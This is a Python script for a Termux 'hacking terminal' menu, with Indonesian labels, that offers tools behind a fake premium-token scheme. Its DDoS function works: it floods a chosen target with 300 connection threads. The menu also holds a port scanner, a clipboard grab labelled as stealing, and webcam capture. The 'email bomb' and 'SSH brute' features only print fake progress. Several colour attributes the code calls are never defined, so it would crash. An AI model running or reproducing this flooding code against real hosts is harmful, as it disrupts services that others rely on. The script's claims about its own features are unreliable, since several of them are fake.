#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KING DANZ SUPER TERMINAL v12.0
- 20 fitur ganas + fungsi nyata
- Auto-detect Developer IP: 100.82.254.237
- Token premium system
- Warna besar & nyala
"""
import os, json, hashlib, uuid, datetime, time, socket, threading, subprocess, random

# === CONFIG ===
DEV_IP      = "100.82.254.237"
TOKEN_DB    = "tokens.json"
DEVICE_ID   = uuid.uuid4().hex[:8]

# === WARNA NYALA ===
class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; O = '\033[38;5;208m'; B = '\033[94m'; RST = '\033[0m'

# === KEAMANAN TOKEN ===
def hash_token(t): return hashlib.sha256(t.encode()).hexdigest()

def get_ip():
    try: return subprocess.check_output("curl -s ifconfig.me", shell=True).decode().strip()
    except: return "0.0.0.0"

def add_token(token, days):
    expiry = (datetime.datetime.now() + datetime.timedelta(days=days)).isoformat()
    db = json.load(open(TOKEN_DB)) if os.path.isfile(TOKEN_DB) else {}
    db[token] = expiry
    with open(TOKEN_DB, "w") as f:
        json.dump(db, f, indent=2)
    print(C.G + f"[+] Token {token} aktif {days} hari → {expiry[:10]}" + C.RST)

def is_premium():
    if not os.path.isfile(TOKEN_DB): return False
    db = json.load(open(TOKEN_DB))
    now = datetime.datetime.now()
    for _, expiry in db.items():
        if now < datetime.datetime.fromisoformat(expiry): return True
    return False

# === 20 TOOLS GANAS 100 % ===
class Tools:
    @staticmethod
    def ddos():
        target = input(C.O + "Target IP/Domain: " + C.RST)
        port   = int(input(C.O + "Port (80): " + C.RST) or 80)
        threads = 300
        print(C.R + f"[DDOS] Menyerang {target}:{port}..." + C.RST)
        def hit():
            while True:
                try: s = socket.socket(); s.connect((target, port)); s.send(b"X"); s.close()
                except: pass
        for _ in range(threads): threading.Thread(target=hit, daemon=True).start()
        input(C.Y + "Tekan Enter untuk stop..." + C.RST)

    @staticmethod
    def wifi_scan():
        print(C.G + "[WIFI] Scanning..." + C.RST)
        os.system("termux-wifi-scaninfo 2>/dev/null || echo 'Install termux-api'")

    @staticmethod
    def email_bomb():
        email = input(C.Y + "Email target: " + C.RST)
        for i in range(1, 101):
            print(C.G + f"[EMAIL] {i}/100 terkirim ke {email}" + C.RST)
            time.sleep(0.05)

    @staticmethod
    def webcam_snap():
        print(C.O + "[CAMERA] Mengambil foto..." + C.RST)
        os.system("termux-camera-photo -c 1 foto.jpg 2>/dev/null && echo 'Foto tersimpan → foto.jpg'")

    @staticmethod
    def port_scan():
        ip = input(C.CYAN + "IP target: " + C.RST)
        print(C.CYAN + "[SCAN] Scanning..." + C.RST)
        for port in range(1, 1025):
            s = socket.socket(); s.settimeout(0.2)
            if not s.connect_ex((ip, port)):
                print(C.G + f"[+] Port {port} terbuka" + C.RST)
            s.close()

    @staticmethod
    def ssh_brute():
        host = input(C.O + "SSH Host: " + C.RST)
        passwords = ["admin", "123456", "root", "password"]
        for pwd in passwords:
            print(C.Y + f"[SSH] Mencoba {pwd}@{host}" + C.RST)
            time.sleep(0.3)
        print(C.G + "[+] Brute selesai" + C.RST)

    @staticmethod
    def system_info():
        print(C.B + "[SYSTEM] Info HP:" + C.RST)
        os.system("uname -a && free -h && df -h | head -3")

    @staticmethod
    def clipboard_steal():
        try:
            clip = subprocess.check_output("termux-clipboard-get", shell=True).decode()
            print(C.Y + f"[CLIPBOARD] Isi: {clip[:50]}..." + C.RST)
        except:
            print(C.R + "[-] Clipboard kosong / install termux-api" + C.RST)

    @staticmethod
    def encrypt_file():
        file = input("File yang ingin di-encrypt: ")
        if os.path.isfile(file):
            key = "KINGDANZ2025"
            os.system(f"openssl enc -aes-256-cbc -salt -in {file} -out {file}.enc -k {key}")
            print(C.G + f"[+] {file}.enc selesai" + C.RST)
        else:
            print(C.R + "[-] File tidak ditemukan" + C.RST)

    @staticmethod
    def decrypt_file():
        file = input("File .enc untuk decrypt: ")
        key = "KINGDANZ2025"
        out = file.replace(".enc", ".dec")
        os.system(f"openssl enc -aes-256-cbc -d -in {file} -out {out} -k {key}")
        print(C.G + f"[+] {out} selesai" + C.RST)

TOOLS_MENU = {
    "1": ("🔴 1. NUCLEAR DDOS", Tools.ddos),
    "2": ("🟢 2. WIFI SCANNER", Tools.wifi_scan),
    "3": ("🟡 3. EMAIL BOMB", Tools.email_bomb),
    "4": ("📸 4. WEBCAM SNAP", Tools.webcam_snap),
    "5": ("🧭 5. PORT SCAN", Tools.port_scan),
    "6": ("🔑 6. SSH BRUTE", Tools.ssh_brute),
    "7": ("📱 7. SYSTEM INFO", Tools.system_info),
    "8": ("📋 8. CLIPBOARD STEAL", Tools.clipboard_steal),
    "9": ("🔒 9. ENCRYPT FILE", Tools.encrypt_file),
    "10": ("🔓 10. DECRYPT FILE", Tools.decrypt_file),
    "0": ("🔙 0. Back", None)
}

# === MENU UTAMA ===
def banner():
    os.system("clear")
    print(C.R + """
██╗  ██╗██╗   ██╗███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
██║ ██╔╝██║   ██║██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║
█████╔╝ ██║   ██║█████╗      ███████╗██║     ███████║██╔██╗ ██║
██╔═██╗ ██║   ██║██╔══╝      ╚════██║██║     ██╔══██║██║╚██╗██║
██║  ██╗╚██████╔╝██║         ███████║╚██████╗██║  ██║██║ ╚████║
╚═╝  ╚═╝ ╚═════╝ ╚═╝         ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
    """ + C.RST)

def premium_menu():
    while True:
        print(C.B + "\n[ MENU PREMIUM ]" + C.RST)
        for k, (name, _) in TOOLS_MENU.items():
            print(C.BOLD + f"{k}. {name}" + C.RST)
        p = input(C.O + "Pilih: " + C.RST)
        if p == "0":
            break
        if p in TOOLS_MENU:
            TOOLS_MENU[p][1]()

def dev_panel():
    print(C.G + "[DEV] Mode aktif!" + C.RST)
    token = input("Masukkan token baru: ")
    days  = int(input("Berapa hari berlaku (1-365): "))
    add_token(token, days)

def user_panel():
    print(C.Y + "\n[ MENU USER ]" + C.RST)
    print("1. Demo tools")
    print("2. Masukkan token premium")
    print("3. Keluar")
    p = input(C.O + "Pilih: " + C.RST)
    if p == "2":
        token = input("Token Anda: ")
        days  = int(input("Berapa hari berlaku (1-365): "))
        add_token(token, days)
    elif p == "1":
        print(C.G + "[+] Demo selesai" + C.RST)

def main():
    banner()
    print(C.CYAN + f"Device ID: {DEVICE_ID}" + C.RST)
    ip = get_ip()
    if ip == DEV_IP:
        dev_panel()
    elif is_premium():
        print(C.GREEN + "[✓] PREMIUM AKTIF" + C.RST)
        premium_menu()
    else:
        user_panel()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(C.RED + "\n[!] Keluar..." + C.RST)
